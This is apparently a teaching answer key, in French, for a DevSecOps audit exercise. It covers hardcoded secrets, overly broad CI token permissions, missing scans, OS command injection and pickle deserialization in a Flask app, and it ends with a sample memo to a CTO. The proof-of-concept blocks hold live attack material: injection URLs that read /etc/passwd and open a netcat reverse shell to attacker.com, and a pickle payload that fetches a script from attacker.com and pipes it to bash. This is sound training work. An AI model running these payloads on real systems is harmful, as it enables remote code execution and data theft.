# Correction — Rapport d'audit DevSecOps

---

## Partie 1 — Fiches de vulnérabilités

---

### VULN-01 — Secrets en clair dans le pipeline CI/CD

| Champ | Valeur |
|---|---|
| Fichier & ligne | `.github/workflows/ci.yml`, lignes 11-12 |
| Nom | Exposition de secrets dans le code source (Hardcoded Credentials) |
| CWE | CWE-312 — Cleartext Storage of Sensitive Information |
| Score CVSS v3.1 | **7.5 ÉLEVÉ** |
| Vecteur CVSS | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |

**Description :**  
Une clé d'accès AWS (`AKIAIOSFODNN7EXAMPLE`) et un mot de passe Docker Hub (`Sup3rS3cr3t!`) sont écrits en clair dans le fichier YAML du pipeline. 
Ce fichier est versionné dans Git et persiste dans l'historique même après suppression. Des outils automatisés comme truffleHog, GitLeaks ou 
les scanners de GitHub Advanced Security détectent le pattern `AKIA` (préfixe des access key AWS IAM) en temps réel après chaque push.

**Preuve d'exploitabilité :**
```bash
# Un attaquant avec accès au repo (ou via un repo public accidentel) récupère la clé :
git log --all --full-history -- "*.yml"
git show <commit_hash>:.github/workflows/ci.yml

# Avec la clé AWS, il peut lister les ressources S3 :
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE \
AWS_SECRET_ACCESS_KEY=<valeur> \
aws s3 ls

# Avec le mot de passe Docker, il peut pusher une image malveillante :
docker login -u monuser -p Sup3rS3cr3t!
docker tag malware:latest monuser/monapp:latest
docker push monuser/monapp:latest
```

**Impact :**  
Compromission du compte AWS (exfiltration de données S3, création de ressources, frais frauduleux). 
Empoisonnement de l'image Docker en production via le compte Docker Hub compromis.

**Correction :**
```yaml
# Dans GitHub : Settings → Secrets and variables → Actions → New repository secret
# Créer : DOCKER_USER, DOCKER_PASSWORD, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY

- name: Login to Docker Hub
  run: |
    echo "${{ secrets.DOCKER_PASSWORD }}" | \
    docker login -u "${{ secrets.DOCKER_USER }}" --password-stdin
```

---

### VULN-02 — Permissions GITHUB_TOKEN trop larges

| Champ | Valeur |
|---|---|
| Fichier & ligne | `.github/workflows/ci.yml`, absence de bloc `permissions` |
| Nom | Violation du principe de moindre privilège sur le token CI/CD |
| CWE | CWE-272 — Least Privilege Violation |
| Score CVSS v3.1 | **6.5 MOYEN** |
| Vecteur CVSS | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N` |

**Description :**  
En l'absence de bloc `permissions`, le `GITHUB_TOKEN` hérite des permissions par défaut du repository, qui incluent généralement `write` sur `contents`, `pull-requests`, `issues` et `packages`. Si un job est compromis (via une action tierce malveillante, ex: attaque sur tj-actions/changed-files en mars 2023), l'attaquant dispose d'un token avec ces droits élevés pour toute la durée du workflow.

**Preuve d'exploitabilité :**  
Scénario d'attaque via action tierce corrompue : si `uses: some-action@v1` exécute du code malveillant, il peut lire `$GITHUB_TOKEN` depuis l'environnement et l'utiliser pour modifier le code source, créer des releases backdoorées ou exfiltrer tous les secrets du repo.

**Impact :**  
Modification du code source, création de releases malveillantes, exfiltration de secrets via l'API GitHub, pivot vers d'autres repos de l'organisation.

**Correction :**
```yaml
permissions:
  contents: read    # lecture seule du code pour le checkout
  packages: write   # uniquement si push sur GitHub Container Registry
```

---

### VULN-03 — Absence de scan SCA, SAST et image Docker

| Champ | Valeur |
|---|---|
| Fichier & ligne | `.github/workflows/ci.yml` — absence d'étapes de scan |
| Nom | Absence de contrôles de sécurité dans la chaîne CI/CD (Missing Security Controls) |
| CWE | CWE-1008 — Weak Source Code (indirect) / OWASP A06:2021 |
| Score CVSS v3.1 | N/A (absence de contrôle, pas une vulnérabilité exploitable directement) |
| Vecteur CVSS | N/A |

**Description :**  
Le pipeline build et déploie l'image en production sans aucune analyse de sécurité intermédiaire. Trois types de contrôles sont absents : (1) SAST — analyse statique du code source Python, (2) SCA — analyse des dépendances pour détecter des CVEs connues, (3) Scan d'image Docker — détection de CVEs dans l'OS de base et les packages système. Note : `requirements.txt` contient Flask 2.0.1 et urllib3 1.26.4 qui ont des CVEs connues.

**Impact :**  
Des vulnérabilités connues (CVEs) dans les dépendances ou l'image de base arrivent en production sans être détectées. Bandit, s'il avait été intégré, aurait automatiquement détecté VULN-04 (B602: shell=True) et VULN-05 (B301: pickle.loads).

**Correction :**
```yaml
- name: SAST — Bandit
  run: pip install bandit && bandit -r app/ -ll

- name: SCA — pip-audit
  run: pip install pip-audit && pip-audit -r app/requirements.txt

- name: Container scan — Trivy
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: monapp:${{ github.sha }}
    exit-code: '1'
    severity: 'CRITICAL,HIGH'
```

---

### VULN-04 — Injection de commande OS (RCE)

| Champ | Valeur |
|---|---|
| Fichier & ligne | `app/app.py`, lignes 8-10 |
| Nom | Injection de commande OS — Remote Code Execution |
| CWE | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |
| Score CVSS v3.1 | **9.8 CRITIQUE** |
| Vecteur CVSS | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |

**Justification du vecteur CVSS :**
- AV:N — exploitable via réseau (requête HTTP)
- AC:L — aucune condition préalable complexe
- PR:N — aucune authentification requise
- UI:N — aucune interaction utilisateur
- S:C — la vulnérabilité est dans Flask mais impacte l'OS hôte (scope changed)
- C:H / I:H / A:H — accès complet au système hôte

**Description :**  
L'entrée utilisateur `host` est directement concaténée dans une f-string passée à `subprocess.run()` avec `shell=True`. Ce paramètre délègue l'exécution à `/bin/sh -c "..."`, qui interprète les métacaractères shell (`;`, `|`, `&&`, `` ` ``, `$()`). Un attaquant peut ainsi injecter des commandes OS arbitraires après le séparateur `;`.

**Preuve d'exploitabilité :**
```bash
# Exécution de commande (id)
curl "http://localhost:5000/ping?host=8.8.8.8;id"
# Réponse : uid=0(root) gid=0(root) groups=0(root)

# Exfiltration du fichier passwd
curl "http://localhost:5000/ping?host=8.8.8.8;cat%20/etc/passwd"

# Reverse shell (si netcat disponible)
curl "http://localhost:5000/ping?host=8.8.8.8;nc%20attacker.com%204444%20-e%20/bin/bash"

# Via commande subshell
curl "http://localhost:5000/ping?host=\$(id)"
```

**Correction :**
```python
import re
ALLOWED_HOST_PATTERN = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')

@app.route('/ping')
def ping():
    host = request.args.get('host', '8.8.8.8')
    if not ALLOWED_HOST_PATTERN.match(host):
        return {"error": "Hôte invalide"}, 400
    result = subprocess.run(
        ["ping", "-c", "1", host],  # liste : pas de shell, pas d'interprétation
        capture_output=True, text=True, timeout=5
    )
    return result.stdout
```

---

### VULN-05 — Désérialisation non sécurisée (pickle)

| Champ | Valeur |
|---|---|
| Fichier & ligne | `app/app.py`, lignes 14-16 |
| Nom | Désérialisation non sécurisée de données non fiables |
| CWE | CWE-502 — Deserialization of Untrusted Data |
| OWASP | A08:2021 — Software and Data Integrity Failures |
| Score CVSS v3.1 | **9.0 CRITIQUE** |
| Vecteur CVSS | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |

**Description :**  
`pickle.loads()` exécute du code Python arbitraire pendant la désérialisation via la méthode magique `__reduce__`. La documentation officielle Python avertit explicitement : *"Never unpickle data received from an untrusted or unauthenticated source."* L'encodage base64 est un encodage, pas un chiffrement — il ne fournit aucune protection. N'importe qui peut générer un pickle malveillant encodé en base64.

**Preuve d'exploitabilité :**
```python
# Script de génération du payload (exécuté par l'attaquant en local)
import pickle, base64, os

class ReverseShell(object):
    def __reduce__(self):
        cmd = 'curl http://attacker.com/shell.sh | bash'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
print(f"Payload : {payload}")

# Exploitation :
# curl "http://localhost:5000/load?data={payload}"
# → pickle.loads() appelle automatiquement __reduce__ lors de la désérialisation
# → os.system() est exécuté → reverse shell obtenu
```

**Impact :**  
Exécution de code arbitraire sur le serveur avec les privilèges du processus Python/Flask.

**Correction :**
```python
import json

@app.route('/load')
def load_data():
    data = request.args.get('data', '')
    try:
        obj = json.loads(data)  # JSON ne peut pas exécuter de code
    except (json.JSONDecodeError, TypeError):
        return {"error": "Données JSON invalides"}, 400
    return {"result": str(obj)}
```

---

## Partie 3 — Note de synthèse CTO (exemple)

**À : CTO de Krypto SAS**  
**De :** Security Engineer  
**Objet :** Résultats de l'audit de sécurité — Pipeline CI/CD et API backend

Monsieur/Madame,

L'audit réalisé sur votre pipeline CI/CD et votre API Flask a mis en évidence **5 vulnérabilités**, dont 2 de sévérité critique permettant à un attaquant externe de prendre le contrôle total de votre serveur de production sans aucune authentification.

**Risques prioritaires :**

1. **Risque immédiat (CRITIQUE)** : la route `/ping` de votre API permet à n'importe qui d'exécuter des commandes sur votre serveur via une simple URL. Une exploitation prend moins de 30 secondes. Action requise : déployer la version corrigée dans les 24h.

2. **Risque immédiat (CRITIQUE)** : la route `/load` permet également l'exécution de code arbitraire. Même priorité de correction.

3. **Risque élevé** : des identifiants AWS et Docker Hub sont stockés dans votre historique Git. Ces credentials doivent être révoqués et régénérés immédiatement, indépendamment des corrections applicatives.

**Recommandations pour renforcer votre posture DevSecOps :**

- Intégrer Bandit (analyse de code) et Trivy (scan d'image) dans votre pipeline CI/CD — ces outils auraient détecté les vulnérabilités 1 et 2 automatiquement avant tout déploiement.
- Utiliser GitHub Secrets pour tous les credentials, et activer l'alerting GitHub Secret Scanning.
- Former les développeurs aux 5 patterns dangereux les plus fréquents en Python (shell=True, pickle, eval, exec, format string dans les requêtes SQL).

Je reste disponible pour accompagner la mise en œuvre de ces corrections.

---

*Rapport rédigé dans le cadre du TP DevSecOps — M1 Cybersécurité*
